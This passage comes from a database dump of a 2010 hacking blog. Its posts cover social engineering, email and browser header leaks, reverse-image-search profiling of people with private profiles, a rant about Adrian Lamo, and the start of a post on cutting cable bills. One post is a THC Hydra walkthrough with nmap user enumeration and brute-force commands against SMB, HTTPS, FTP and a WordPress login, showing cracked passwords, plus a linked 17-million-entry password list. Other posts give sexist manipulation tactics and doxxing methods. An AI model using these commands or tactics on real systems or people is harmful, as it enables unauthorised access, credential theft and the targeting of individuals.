characteristics, so they have to be developed.  I developed my social ability as a sales person once long long ago.  I was one of those computer geeks who never left the computer.. then I was forced to get a job (I was in my teens.. hush.)  For the first month, I was so out of my element.. having to walk up to people and engage them in conversation and attempt to manipulate them into buying something was definitely not my personality.\n\nBut, then I saw my coworkers making big bucks because they were able to do this.. so I watched, learned, and forced myself over my insecurities and eventually started to come across as a confident individual with no fear who was able to talk to anyone about anything.  The direct result was an increase in pay.  I then realized that using this as a hacker was also very, very beneficial.\n\nNow, I\'m still an introvert, for the most part, but I have no problem talking to people and people don\'t believe that I\'m actually really shy.\n\nOn a side note, chicks really dig this characteristic.  So, it comes in handy both in social situations as well as corporate.  Most receptionists are female, after all.\n\nFor the female readers out there (do I have any??) you, unfortunately, are at a bit of a disadvantage when it comes to social engineering.  Sort of.\n\nChicks have the ultimate trump card when it comes to being manipulative.  Because it\'s often said that it\'s a \"man\'s world\", men are generally the ones who are in positions of power.  And women are stuck with coming across as a \"bitch\" when they try to act confident, so this is not the approach you want to take when trying to social engineer.  Also, avoid speaking with other women in this process.  Chicks are vicious to one another.  A chick trying to social engineer another chick would be like running in front of a firing squad.  Sure, occasionally a round will miss.. but the majority of them are going to hit you.\n\nThat said, you have an even better target.  The men.  And, since they\'re in a position of power, it\'s generally easy to get the information you want without having to worry about access restrictions.\n\nHow do you do this?  Well, sex.  No, I don\'t mean whoring yourself.. but women, ultimately, have the real power.  They can get a guy to do whatever they want by a bat of the eye lashes, talking in a certain way, or acting helpless.  Men cannot resist helping a woman in distress.. it\'s hard coded into us.  So, sure.. you may be the epitome of confidence, but occasionally you\'ll have to humble yourself and use your body and your sex to get what you want.  Humiliating, you say?  What\'s more humiliating is when the vice president of the company realizes that some chick was able to steal his entire client base because she bat her eyelashes and shows some leg and cleavage.\n\nWhat can I say?  We\'re pigs.. chicks, use it to your advantage.  Seriously, if a chick called me up and acted like she knew what she was talking about and started asking me to send her stuff or give her information, I\'d be like, wtf.  Bitch.  However, if the same chick called me up and used a seductive voice and acted, somewhat, helpless.. that would trigger some neanderthal genetic trait in me and I\'d get owned.\n\nSad, when you think about it.  What\'s even more sad, is my mind would probably be saying \"YOU SHOULDN\'T GIVE HER THAT.  NO!  STOP!\".. but I still would.\n\n\n','','2010-06-04 11:39:22','2010-06-04 16:39:22','','','2010-06-04 11:39:22','2010-06-04 16:39:22','what-it-takes','0','','publish','What it takes.','post',''),(

Sorry, just a simple fact.  ;-)\n\nSo, as I\'ve shown in a few different posts, using header information (both browser and email) can be a simple but effective way of collecting information about a target.  It helps to determine what software they\'re running, IP addresses, network configuration, so on and so forth.  I haven\'t talked much about how to defend against these leaks, though.  So that\'s what I\'m going to do here.  I will show you the headers, the information they leak, and how to fix them.  This post is going to cover email, while my next post will cover browser headers.\n\nIn my first \"<a href=\"http://www.attackvector.org/?p=173\">Invasion of Privacy</a>\" post, I used email header information to find out the real IP address of Steve, the guy who sent me the spam.  This information helped to determine geographic location, which ultimately helped in getting his address, which then lead to complete ownership.\n<!--more-->\nYou want to avoid having your real IP shown in headers as much as possible.  Sometimes it probably doesn\'t matter, but other times, it\'s a serious issue.  So, lets discuss the ways people send and receive email.\n\nMethod 1)  You have your average desktop user using Outlook, Outlook Express, Eudora, Thunderbird, whatever.  They pop and send email using their ISP\'s email server.  Locating their IP information is simple.\n\n<blockquote>\nReceived: by 10.213.112.212 with SMTP id x20mr859543ebp.1.1276036240432; Tue, 08 Jun 2010 15:30:40 -0700 (PDT)\nReturn-Path: <someguy@gmail.com>\nReceived: from [10.0.1.4] (cpc1-pete1-2-3-cust123.know.cable.virginmedia.com [86.0.12.123])\n        by mx.someisp.com with ESMTPS id 16sm3669165ewy.11.2010.06.08.15.30.37\n        (version=TLSv1/SSLv3 cipher=RC4-MD5);\n        Tue, 08 Jun 2010 15:30:39 -0700 (PDT)\nFrom: Some Guy <someguy@gmail.com>\n</blockquote>\n\nYou\'ll notice that the last received line before the \"From\" header shows that an email was received to a server with the IP of 10.0.1.4 from a client with the IP of 86.0.12.123, and it\'s even nice enough to do the reverse lookup for us.  Additionally, look for the \"X-Mailer\" header.  This gives the name of the email client that the user is using.  With the version.  I appreciate that software companies make my life easier.\n\nAnyway, so this person\'s real IP address is 86.0.12.123.  \"Okay, so how do you prevent this information from being leaked?\"  Well, the short answer is.. you don\'t.  Which is actually good for all parties involved, because this information is crucial when tracking down spam.\n\nThe more detailed answer is.. find a proxy to bounce through before sending via smtp.  Good luck, however.  If you pay for a proxy service, they probably allow you this luxury, but I\'m not aware of any free proxy service that will proxy smtp.  Again, this is because they don\'t want to protect the spammers, nor do they want to be the ones winding up in the RBL\'s.  So.. just know that if you\'re sending via a traditional email client, the end user will have your IP address.\n\nMethod 2)  Today I think most people have migrated to web mail.  gmail, yahoo, hotmail, yada yada yada.. for obvious reasons.  Next time you get an email from, say, a yahoo email address, check out the full headers.  You should see something like this:\n\n<blockquote>\nReceived: from [75.92.123.123] by web110403.mail.gq1.yahoo.com via HTTP; Thu, 03 Jun 2010 07:10:48 PDT\nX-Mailer: YahooMailClassic/11.0.8 YahooMailWebService/0.8.103.269680\n</blockquote>\n\nOr\n\n<blockquote>\n....\nX-Originating-IP: [75.92.123.123]\n</blockquote>\n\nTo be honest, I\'m not sure why some emails have the \"X-Originating-IP\" and some don\'t.. maybe it depends on which Yahoo server the email is sent through, or something.. but.  I\'ve noticed that with Hotmail, the X-Originating-IP is almost always in the headers.\n\nOne thing to note.  Gmail does not include this header, nor does it provide a \"Received\" header that includes the clients IP address.  I believe this is due to how gmail\'s servers route email.  So, by using the Gmail web interface, you won\'t be leaking your IP.\n\nHow can you stop this?  Using a web proxy (like Tor) will hide your IP.. but then you run into the risk of sending credentials through a proxy, which leads to other security risks.  So, caveat emptor.\n\n\nMethod 3)  Using a standard email client to pop/smtp through email providers like yahoo, hotmail, gmail, et. al.\n\nWell, by using this method, you\'ll wind up generating pretty much all of the headers listed above, and, again, your only solution would be to find a proxy that will relay port 25.\n\nWhats the moral of this story?  Be careful of who you send email to, what you respond to, and what headers your email service/client is generating.  Regularly send emails to yourself and check the headers.  (Do not email to the same address that you\'re sending from, this will not generate the same headers as if you sent to someone else.  You need to have 2 email addresses.)\n\nThe way I have my email system set up is, well, overly complicated, but it provides a few different failsafes in case one of my services decides to begin including their clients real IP\'s in the headers.  I essentially use gmail as a proxy, and no, not in the way you think.\n\n;-)\n\n','','2010-06-09 11:33:06','2010-06-09 16:33:06','','','2010-06-09 11:33:06','2010-06-09 16:33:06','email-headers-and-information-leaks','0','','publish','Email headers and information leaks.','post',''),(

The new privacy controls make things a lot easier for the end user to protect his/her information.\n\nThis makes my job a little more difficult, because now I actually have to work to obtain information.  Sort of.\n\nOne of my backup techniques that I use when I encounter a Facebook page that is, mostly, set to private, is the profile picture.  (Btw, when I say Facebook, I mean myspace, facebook, twitter, linkedin, etc etc etc.)\n\nYou\'re probably asking, \"So what.. what can a profile picture tell you about anything?\"  Ah, young grasshoppa, there are many things a profile picture can tell you.  Besides the obvious, what if I told you that you could use a profile picture the same way that you would use a name when trying to reveal someones identity?\n<!--more-->;\nWe\'ll start with this kid.  I have no idea who he is, but he was the first on the list when I did a search on facebook.\n\n<center><img width=\"600\" src=\"http://www.attackvector.org/pics/flickr.png\"></center>\n\nHe\'s actually done a pretty good job at setting his profile to private.  There is literally nothing on his profile page except for \"sex: male\" (not sure that this is accurate.. lol).  Totally does not tell me anything.  But, what about his profile picture?\n\n<center><img src=\"http://www.attackvector.org/pics/flickr.jpg\"></center>\n\nThere\'s a service called \"tineye.com\" (<a href=\"http://www.tineye.com\">www.tineye.com</a>) which does whats called a \"reverse image search\".  When I copy &amp;amp; paste the URL of his profile picture from facebook, I get the following:\n\n<center><img src=\"http://www.attackvector.org/pics/flickr2.png\"></center>\n\nAll sorts of stuff.\n\nOne thing to note.. you need to verify that the profile picture that you\'re using is actually a picture of the target and not just some random picture.  In this case, it\'s beginning to look like this is just a random picture of some EMO kid, but I think you get the idea behind this method.\n\nAlso, it doesn\'t really even have to be their profile picture, to be honest.  You could use any picture that they\'ve posted on their social website, which they may have posted on some other website.\n\nI have used this method, successfully, on people who believed that they had done a good job at protecting their information.  Most had, but they overlooked that using the same profile picture on their facebook, myspace, twitter, and flickr page allowed me to pull together enough information to build a profile of them.  One page may have said a birthdate, another said a name, and yet another said the name of a spouse, etc.  It\'s definitely a round-robin way of doing things, but it\'s kind of like the hail marry bomb when everything else has failed.\n\nI suggest playing around with this technique and test it on yourself.  A new rule to follow, similar to passwords, is don\'t use the same profile picture on multiple websites unless you don\'t mind having all of your information found.  ;-)\n','','2010-06-09 12:58:24','2010-06-09 17:58:24','','','2010-06-09 12:58:24','2010-06-09 17:58:24','social-sites-profile-pictures-and-privacy','0','','publish','Social sites, profile pictures and privacy.','post','');

'329','8','open','http://www.attackvector.org/?p=329','0','open','','2','In <a href=\"http://www.attackvector.org/?p=267\">this</a> post, I point out a few browser headers which leak information that can be used for malicious purposes.  I\'m going to go into a little more detail in this post and give some pointers on what you can do to protect yourself.  Sort of.\n\nFirst, lets take a look at the headers which are the most useful for an attacker.\n\nThey are:\n<!--more-->\n<blockquote>\nHTTP_USER_AGENT\nREMOTE_ADDR\nHTTP_VIA\nHTTP_X_FORWARDED_FOR\n</blockquote>\n\nHTTP_USER_AGENT - This gives information about the OS and web browser the end user is using.  This can be useful when trying to passively identify a target, as well as pin point an attack vector (browser based attack) if the browser the user is using is old/older.\n\nREMOTE_ADDR - This gives the IP address of the machine connecting to the website.  This is collected server side and the client cannot change it*\n\nHTTP_VIA - This gives up information about whether a user is behind a proxy and, if so, what proxy software and version they\'re using\n\nHTTP_X_FORWARDED_FOR - This reveals the actual IP address of the end user when they connect to your site via proxy.\n\n* The only way to modify REMOTE_ADDR would be via spoofing.  The connection would be simplex, so only commands would be transfered, the client would never receive the response.  This would be done using TCP sequence prediction which is more difficult today than it once was.  I have not seen or heard of a successful TCP seq. pred. spoofed attack in a very, very long time.\n\nSo, the only one that can\'t (easily) be changed is REMOTE_ADDR.. the rest are controlled from within the browser and/or proxy.  We\'ll start with the user agent.\n\nDepending on your web browser, there are many different ways to change the user agent.  We\'ll start with Firefox, because that\'s the easiest.\n\nIn the address bar of Firefox, type\n\n<blockquote>\nabout:config\n</blockquote>\n\nIn the \"Filter\" box, type:\n\n<blockquote>\nuseragent\n</blockquote>\n\nRather than changing the whole string at once, you have to modify each individual part of the string.  If you want to see what your current user agent header looks like, go <a href=\"http://www.attackvector.org/cgi/env.cgi\">here</a>.\n\nAlternatively, if you don\'t feel like doing it by hand and want a few more features (like, the ability to mimic a different browser entirely), Firefox has a plugin called \"User Agent Switcher\".  I haven\'t played with it, but it appears pretty straight forward and simple.\n\nNext, we\'ll change the user agent of Chrome.  (ps - if you\'re not using Chrome, you should be.. for a multitude of reasons - faster, lighter, more secure.  \'nuff said)\n\nChanging the user agent is pretty simple in Chrome.  There\'s a \"--useragent\" startup switch.  So, example:  \n<blockquote>\ngoogle-chrome --useragent=\"Chrome is the best!\"\n</blockquote>\n\nWill result in: \n\n<blockquote>\nHTTP_USER_AGENT:Chrome is the best!\n</blockquote>\n\nThere are quite a few command line switches for Chrome.. you can find some of them <a href=\"http://chromespot.com/forum/google-chrome-tips-and-tricks/697-chrome-exe-command-line-switches.html\">here</a>.  I did notice, though, that they don\'t list \"useragent\" as being a command line switch.  Not sure why.  Also, you may want to check out the \"--incognito\" switch and, if you\'re daring and prefer security over ease of use, add that as one of your default startup options.  I do.  :-)\n\nOk, on to.. ahem.. Internet Explorer.  Does anyone even really run this pile of crap anymore?  I mean, how many times will you have to rid yourself of spyware, malware, viruses, etc. before you\'ll decide that it\'s easier to run a different browser than it is to reinstall Windows every 3 days? </rant>\n\nAnyway, for those of you who, for whatever reason, still choose to run IE, here\'s how you change it\'s user agent.  Though, I\'m surprised you\'re even interested, because security OBVIOUSLY isn\'t of much concern to you.  (Sorry, I really hate Windows.. and by combining Windows & IE my hatred grows rapidly.  Get used to being flamed in my posts if you\'re running IE.. :-) go <a href=\"http://www.pctools.com/guides/registry/detail/799/\">here</a>.  He has a good write up on the topic.\n\n<b>CAVEAT</b>:  A lot of websites rely on the user agent string to format their pages correctly.  If you change your user agent string to something random (like, \"Chrome is the best!\", for example) you will break pages and some pages wont even let you visit their site.\n\nThe next two, HTTP_VIA and HTTP_X_FORWARDED_FOR will need to be changed at the proxy level, since these are headers added by a proxy.  Here\'s a good example of why you\'ll want to make sure you\'re using a proxy that doesn\'t send this information:\n\n<blockquote>\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; Media Center PC 6.0; InfoPath.2; MS-RTC LM 8)\n\nIP Address               : 187.60.253.30\nReverse DNS              : 187.60.253.30\nReverse DNS IP           : 187.60.253.30\nReverse DNS Authenticity : [Possibly Forged]\nProxy Info               : PROXY DETECTED\nProxy Data               : 187.60.253.30 | MASKED IP: 78.88.168.38\nProxy Status             : TRUE\nHTTP_VIA                 : 1.1 187.60.253.30 (Mikrotik HttpProxy)\nHTTP_X_FORWARDED_FOR     : 78.88.168.38\n</blockquote>\n\nThis is someone who tried to leave comment spam.  Because he\'s an idiot, he\'s using a proxy that passes on the HTTP_X_FORWARDED_FOR and the HTTP_VIA headers, giving me information about the proxy as well as revealing his real IP address.  So, he shouldn\'t even bother using a proxy if he\'s attempting to use to surf anonymously.\n\nThere are about a billion different proxy server software suites out there and each will need to be configured differently.  Here, I will focus on the only one that I use (for many reasons) and will run on both *NIX and Winblows.  Though, running a proxy server on a windows box seems... hm.  Strange?  Can\'t think of a nice way to write what it is that I\'m thinking, so we\'ll just say that it\'s not something that I would advise.  How about that for being politically correct?  ;-)\n\nAnyway, Squid has an enormous amount of configuration options.  Take a few hours and read through the squid.conf file to see what I mean.  But, for the sake of this post, we\'re really only interested in two options.\n\n<blockquote>\n#  TAG: via     on|off\n#       If set (default), Squid will include a Via header in requests and\n#       replies as required by RFC2616.\n#\nvia off\n</blockquote>\n\nYes, by setting this to \"off\" you\'re breaking RFC2616 compliance, but.. sometimes the RFC is wrong.  (I\'m starting to sound like Microsoft.....)\n\nThe other Squid option that you want to configure is:\n\n<blockquote>\n#  TAG: forwarded_for   on|off\n#       If set, Squid will include your system\'s IP address or name\n#       in the HTTP requests it forwards.  By default it looks like\n#       this:\n#\n#               X-Forwarded-For: 192.1.2.3 \n#\n#       If you disable this, it will appear as\n#\n#               X-Forwarded-For: unknown\n#\n#Default:\nforwarded_for off\n</blockquote>\n\nAgain, make sure to set it to \"off\", because the default is \"on\".\n\nA good site that I found that talks about configuring Squid\'s privacy options is <a href=\"https://calomel.org/squid.html\">https://calomel.org/squid.html</a>.\n\nAlso, if you have instructions on how to change these options in other proxies, feel free to write them up in the comments below.\n','','2010-06-15 13:01:03','2010-06-15 18:01:03','','','2010-06-15 13:01:03','2010-06-15 18:01:03','browser-headers-and-information-leaks','0','','publish','Browser headers and information leaks','post',''),(

However, because this story has its roots in technology and hacking, I feel that it fits my genre.\n\nFirst, some background.  I\'m sure most of you know of <a href=\"http://en.wikipedia.org/wiki/Adrian_Lamo\" rel=\"nofollow\" target=\"_blank\">Adrian Lamo</a>, also known as \"The Homeless Hacker\".  I think using the term \"Hacker\" to describe Lamo is used rather loosely, but I\'m not sure what would describe him more accurately.  His entire \"hacking\" career consisted of using a web browser to dig through corporate websites in order to find information that the company may not have wanted public.  No coding, no scripting, nothing.  He just has an ability to sit in front of a computer, point and clicking his way around a website, for longer than most other people.  Does this make him a hacker?  It really comes down to definition.\n<!--more-->\nI actually knew Lamo once upon a time.  He and I spoke on multiple occasions and I found him to be scattered and, well, odd.  Recently it was discovered that he has Aspergers syndrome, which explained a lot when I found out.  All of a sudden our strange and convoluted conversations that we once had made sense.\n\nAt one point, he had a warrant out for his arrest as a result of his unauthorized access into certain parts of networks belonging to Microsoft, Yahoo, the New York Time\'s, et al.  He subsequently turned himself in and was sentenced to 6 months of house arrest at his parents home.\n\nHe was also in the recently released documentary entitled \"Hackers Wanted.\"  A more appropriate title would have been, \"A day in the life of Adrian Lamo\", but I digress.  The documentary is available via torrent if you\'re interested in seeing it.\n\nNow that you have some background information, I\'ll get to the real point of this post.\n\nAdrian Lamo has been portrayed as being like Kwai Chang Caine of the hacker community.  No possessions, no address, drifting from one location to another, not accepting money for doing work, and loads of other monk-like behavior.  However, during his journey, he realized that the media loves stories like this.  He began doing interview after interview.  He was in the spotlight and getting the attention that mommy and daddy never gave him.  He loved it.\n\nHis fame lasted for longer than it should have, honestly, but just like every other fad, Adrian went back into the hole that he crawled out of as soon as the cameras found something new to focus on that as more interesting than poor little Lamo.\n\nThat was until May of 2010 when he had his backpack stolen which held his ADD medication.  He called the police to file a report and the police thought that Adrian was so bizarre and unusual, that he might be psychotic and a threat to himself.  So, once again, Adrian gets arrested and put in to 72 hour psychiatric hold.  And, once again, he\'s back in the headlines, \"Psychotic Hacker Adrian Lamo Committed to Asylum\", or some such nonsense.  And, once again, Adrian\'s happy because the camera is focused on him.  And, once again, he\'s crawled out of his hole to bless us with his presence.\n\nThis time, however, he intends on staying in the limelight for as long as possible.  Because he possesses virtually no technical ability, the only way he can accomplish this is by throwing someone else under the bus.  Enter <a href=\"http://en.wikipedia.org/wiki/Bradley_Manning\" rel=\"nofollow\" target=\"_blank\">Bradley Manning</a>.\n\nBradley Manning worked as a US Army Intelligence Analyst and was able to access confidential documents on the Army\'s network.  He found thousands of them and submitted them to <a href=\"http://www.wikileaks.com\" rel=\"nofollow\" target=\"_blank\">Wikileaks</a>.  One of his leaks was a video of a US Blackhawk helicopter smoking two Reuters journalists.  Literally hovering over them and raining down gunfire any time they saw movement.  They then also smoked the driver and the kids inside of a van that came to try to pick up the survivors and find them medical aid.  Obviously, the government would have preferred that this stay underwraps, but Bradley Manning released it and broke a huge story.  Who knows what else was contained in the thousands of other documents and videos that he submitted.  Wikileaks has not released them yet and, as of the last report that I saw, they\'re still working on decrypting the videos and verifying the data.\n\n<center><embed src=\"http://i.cdn.turner.com/cnn/.element/apps/cvp/3.0/swf/cnn_416x234_embed.swf?context=embed&videoId=world/2010/04/06/vo.apache.reuters.journalists.cnn\" type=\"application/x-shockwave-flash\" bgcolor=\"#000000\" allowfullscreen=\"true\" allowscriptaccess=\"always\" width=\"416\" wmode=\"transparent\" height=\"374\"></embed></center>\n\nBut, how do we know that it was Bradley Manning that released all of this?  I mean, obviously anyone stealing information surrounding government cover ups and corruption would not want to be revealed, right?  Well, Adrian Lamo viewed this as the perfect opportunity to get back in front of the camera and suck up all the attention that he could get.  How did do this?  Bradley Manning made a huge mistake.  He trusted Lamo and kind of spilled his guts about what he had done.  Lamo merely sat there, listening and logging, trying to pry more information out of Manning.\n\nOnce he had as much information as he thought he would need, he went to the FBI and handed it over.  I would imagine the exchange went down something like this:\n\n<blockquote>\n<Adrian>  Hi FBI guys, I have information that you might be interested in regarding confidential and top secret military information\n<FBI> Why, yes, that is something we\'d be interested in.. how would you like to be compensated for this information?\n<Adrian> Well, because money goes against my monk-like lifestyle and Jesus, I don\'t want money... but if you can make sure that Wired, Slashdot, NBC, CBS, the New York Times, Life, Time, National Geographic, Playboy, Penthouse, Hustler, and the Gideons all show up with cameras and reporters when I turn this over, I can have it to you by tomorrow.\n<FBI> ....\n</blockquote>\n\nYes, Manning made a mistake to trust anyone.  That\'s pretty much rule #1 of this game.  Trust no one.  So, did he get what he deserved for breaking that cardinal rule?  I guess.  Let it be a lesson to everyone else; Seriously, don\'t trust anyone.  Assume that everyone is out to get you or will, at least, throw you under the bus if it comes down to it.\n\nHowever, given Lamo\'s background, his \"status\", etc.  I\'m sure Manning figured that he was safe talking to him.  I mean, Lamo was also a submitter to Wikileaks, plus he was a former \"hacker\" (read: internet explorer master), so why not?\n\nSo, Adrian, prior to this episode, I figured you were just another talentless script kiddy media whore.. come to find out, however, that you don\'t even live up to that title.  Somehow you have found a level 10 or 12 notches down from that one, which is quite a feat, considering I figured \"talentless script kiddy media whore\" was at the bottom of the food chain.  How about, \"the feces of the talentless script kiddy media whores\"?\n\nThe reason why this upsets me so much is due to the fact that Wikileaks is providing a service that allows us to get our hands on information that the governments of this world would never allow us to have.  They prefer to keep us blind, deaf, and dumb, and Wikileaks is combating that.  By Lamo outing one of its submitters, people are going to begin to think twice about submitting information that could ultimately wind them up in prison, or lynched.\n\nHonestly, the end goal for most hackers is obtaining information because we believe that information should be free (sorry, I realize that\'s a huge cliche, but....).  The last thing I would have expected from a member of this community is turning on someone who\'s releasing information.  I guess I shouldn\'t say \"last thing\", because I\'ve seen it happen before amongst this culture, but it was generally due to someone getting heat from the feds and narcing on someone else to protect their own necks.  But never have I seen someone out someone else, simply to get in front of the camera for an additional 15 minutes of fame.\n\nAdrian, you are a sad, pathetic little individual.  You can blame it on your medications, or aspergers, or anything else you want, but in the end.. what you did was wrong, and you did it for the wrong reasons.  Enjoy your time in front of the camera, but you had better walk a pretty straight and narrow line from this point on, because one slip and someone is going to narc on you like you\'ve never been narc\'d on before and I will definitely be republishing that story here.

I would consider this to be another one of those last resort methods that I use when all else has failed.\n\nI don\'t like to use brute force methods because they\'re noisy and can break stuff.  There\'s actually a fine line between a brute force and a denial of service attack, so be careful whenever using this method.\n\nAnyway, there are 3 programs that I use when it comes to brute forcing passwords.  There\'s something I wrote (which is not public, so I wont be releasing it.. sorry. :) ), there\'s ncrack, which is relatively new and still under development, and then there\'s THC Hydra.\n\nI think ncrack will be a solid contender in this arena after it\'s be fine tuned, but as of this point, Hydra is still the leader, so that\'s what I\'m going to focus on in this post.\n<!--more-->\nHydra has the ability to brute force passwords over a multitude of services:\n\n<blockquote>\nSupported protocols: telnet ftp pop3[-ntlm]   imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco  cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5   rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere  teamspeak sip vmauthd\n</blockquote>\n\nA couple examples...\n\nFirst, grab the userlist from the PDC...\n<pre lang=\"bash\">\n\nnmap --script=smb-enum-users 192.168.0.3 -p 445|perl -le \'while(<STDIN>){if(/^.*?\\(w+)s+.*/) { print \"$1\"; }}\' >> userlist\n\n</pre>\n\nThen run the userlist through Hydra..\n\n<blockquote>\n# hydra -L userlist -P password 192.168.0.3 smb\n[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)\nHydra v5.4 (c) 2006 by van Hauser / THC - use allowed only for legal purposes.\nHydra (http://www.thc.org) starting at 2010-06-17 12:08:24\n[DATA] 1 tasks, 1 servers, 180 login tries (l:30/p:6), ~180 tries per task\n[DATA] attacking service smb on port 139\n[139][smb] host: 192.168.0.3   login: Administrator   password: zygote\n[139][smb] host: 192.168.0.3   login: audit   password: qwerty\n[139][smb] host: 192.168.0.3   login: bdouglas   password: javajoe\n[139][smb] host: 192.168.0.3   login: security   password: qwerty\n[139][smb] host: 192.168.0.3   login: testuser   password: qwerty\n[STATUS] attack finished for 192.168.0.3 (waiting for childs to finish)\nHydra (http://www.thc.org) finished at 2010-06-17 12:08:24\n</blockquote>\n\nYou\'ll notice that I started the attack at 12:08:24 and it finished at 12:08:24, to give you an idea of the speed.\n\nThe next example will be attacking their website.  Their website uses .htaccess to protect certain areas.  We\'ll use the same userlist that we stole from the PDC and hope that one of them is listed in the .htpasswd file.\n\n<blockquote>\n# hydra -L userlist -P password www.companysite.com https-head /financials/\nHydra v5.4 (c) 2006 by van Hauser / THC - use allowed only for legal purposes.\nHydra (http://www.thc.org) starting at 2010-06-17 12:15:15\n[DATA] 16 tasks, 1 servers, 217 login tries (l:31/p:7), ~13 tries per task\n[DATA] attacking service http-head on port 443\n[443][www] host: 11.22.33.44   login: bdouglas   password: javajoe\n[STATUS] attack finished for www.companysite.com (waiting for childs to finish)\nHydra (http://www.thc.org) finished at 2010-06-17 12:15:22\n</blockquote>\n\nGreat, found one.  Now it would be really handy to have access to the FTP site for their website...\n\n<blockquote>\n# hydra -L userlist -P password ftp.companysite.com ftp -f\nHydra v5.4 (c) 2006 by van Hauser / THC - use allowed only for legal purposes.\nHydra (http://www.thc.org) starting at 2010-06-17 12:24:14\n[DATA] 16 tasks, 1 servers, 224 login tries (l:32/p:7), ~14 tries per task\n[DATA] attacking service ftp on port 21\n[21][ftp] host: ftp.companysite.com   login: bdouglas   password: javajoe\nHydra (http://www.thc.org) finished at 2010-06-17 12:24:17\n</blockquote>\n\nThis bdouglas guy has access everywhere.. and he\'s super original with his passwords, too.\n\nAs you can see, hydra is pretty effective when it comes to brute forcing various services.  The most important part is to have an effective password list.  \n\nBecause humans are, well, human, they tend to think alike.  That\'s why passwords like, \"love\" and \"sex\" and \"password\" are always amongst the top of the \"Most Frequently Used Passwords\" list.  So, what I\'ve done is collected password lists from various network compromises where a password list was made public and combined them all into one gigantic list of 17,965,793 passwords and wrote a little script to make sure there are no duplicates.  :-)\n\nThe sources used to create this list are:\n\n<li>The 500 worst passwords list</li>\n<li>Alyssa banned passwords list</li>\n<li>Cain\'s list of passwords</li>\n<li>Conficker\'s list</li>\n<li>The English dictionary</li>\n<li>Faithwriters banned passwords list</li>\n<li>Hak5\'s list</li>\n<li>Hotmail\'s banned passwords list</li>\n<li>Myspace\'s banned passwords list</li>\n<li>PHPbb\'s compromised list</li>\n<li>RockYou\'s compromised list</li>\n<li>Twitter\'s banned passwords list</li>\n<li>The names of all US cities</li>\n<li>And various other ones that aren\'t worth mentioning... </li>\n\nWhat we wind up with, is an enormous list of the most popular passwords, which is incredibly effective.\n\nAnd, because I\'m such a nice and wonderful guy, I\'ve decided to share it with my readers.  You can find it <a href=\"http://www.attackvector.org/files/thelist.txt.bz2\">here</a>.  It\'s bzipped and still about 95 megs.\n\nYou can find THC at <a href=\"http://freeworld.thc.org/\" rel=\"nofollow\" target=\"_blank\">www.thc.org</a> and you can find THC Hydra at <a href=\"http://freeworld.thc.org/thc-hydra/\" rel=\"nofollow\" target=\"_blank\">http://freeworld.thc.org/thc-hydra/</a>\n\nIt\'s also worth mentioning, though, that Hydra seems to fall short when it comes to web forms.  Theoretically, it\'s capable of handling a web form, but I\'ve yet to be able to make it work.  For that, I use other utilities.. which I\'ll blog about here at some point.\n\nHowever, according to the Hydra documentation, this is how it\'s supposed to work against a web form:\n\n<blockquote>\n# hydra -l admin -P passwod www.wordpressblogsite.org http-post-form \"/wordpress/wp-login.php:user_login=^USER^&user_pass=^PASS^:Incorrect\" -t 4\n</blockquote>\n\nWhat this is telling Hydra is that in the form, the two input boxes are named \"user_login\" and \"user_pass\", respectively, and that Hydra should fill in those blanks with the various username and password combinations specified via the command line.\n\nHow you figure out what the form input boxes are named.. simply go to the website, view the source of the page, and look for:\n\n<blockquote>\n...snip...\ninput type=\"text\" name=\"log\" id=\"user_login\" class=\"input\"\n..snip...\ninput type=\"password\" name=\"pwd\" id=\"user_pass\" class=\"input\"\n</blockquote>\n\nPretty simple.. but, again, Hydra doesn\'t seem to like it.  If you\'ve gotten this to work yourself, please let me know.  I\'d be interested in seeing what I\'m doing wrong.  :-)\n\n','','2010-06-17 12:53:02','2010-06-17 17:53:02','','','2010-06-17 12:53:02','2010-06-17 17:53:02','brute-force-with-thc-hydra','0','','publish','Brute Force with THC Hydra','post',''),(
'366','5','open','http://www.attackvector.org/?p=366','0','open','','2','Notice that I didn\'t say \"free\" in the title.  Very rarely can you get free services from, say, your cable provider, your internet provider, etc.  But, you can get them greatly reduced using some really simple techniques that I will talk about here.\n\nAlso, I would love to hear from you on some techniques, tricks, ideas, whatever, that you use to obtain free/reduced price services and products.\n\nI\'m actually going to use an example that I just went through today that got one of my bills reduced by half (actually, more than half) and was applied to the previous two bills as well.\n<!--more-->\nSo, I\'m really tired of being nickled and dimed by internet/television service providers.  Yes, I realize that they need to make money and that they spend a lot of money on infrastructure and employees, etc.  But, they kind of have a monopoly in my area, which allows them to charge just about whatever they want without much (any?) competition.\n\nWe\'re going to call this company... Comcrap.\n\nMy service is pretty simple.  \n\n<center>\n<li>16mb internet - $52</li>\n<li>HD DVR - $15</li>\n<li>Digital cable - $79</li>\n<li>Rental modem - $5</li>\n<li>Taxes - Ridiculous</li>\n<li>Total: About $165 on average</li>\n</center>\nThat, to me, is a hideous amount to pay for what I get.  Half the channels I don\'t even use and I don\'t have any premium channels (HBO, Showtime, etc.)  Something must be done about this.\n\nFirst, about a month ago I went to Comcrap\'s website and began researching their television plans.  I went through each one of them, channel by channel to see which plan had all the channels that I use (Food network, Discovery, NatGeo, A&E..)  I find this virtually unadvertised plan called \"Digital Economy\".  Low and behold, it has all of the channels I watch, plus a lot of others that I don\'t.  Price? $29.95.  Immediately saving $50 a month just on the television portion.  Nice.\n\nSo, I call Comcrap and start talking to them about cable services.  They list off 3 plans, never mentioning the \"Digital Economy\" plan.  I ask the lady on the phone, \"What about the Digital Economy plan?\"  ...pause... \"I\'ve never heard of that plan...\"  Interesting, so this plan is apparently not part of their script, or regular list that they use when customers call in about plan options, even though it has virtually every channel people want.\n\nShe looks it up and goes, \"Wow.. I didn\'t even know we had this plan.\"  I respond with, \"It seems that it has most of the channels that I\'m looking for, too\"  She says, \"Yeah, me too!\" with a certain amount of excitement in her voice.  Maybe she just found her new plan as well.\n\nShe does indicate, however, that apparently the DVR will no longer work and that I\'ll have to return it.  Bummer.. big.. big bummer.\n\nBut, I schedule some tech to come out on the 12th and put a filter on my line so that I can be downgraded.  I cancel the first appointment and they have to reschedule it for a week and a half later - the 26th (important).\n\nI wait the additional week and a half and the tech gets to my house and I explain what I\'m doing and he informs me that, officially, Comcrap doesn\'t support the DVR on the Digital Economy plan.. however.. it works just fine.\n\nSo, they 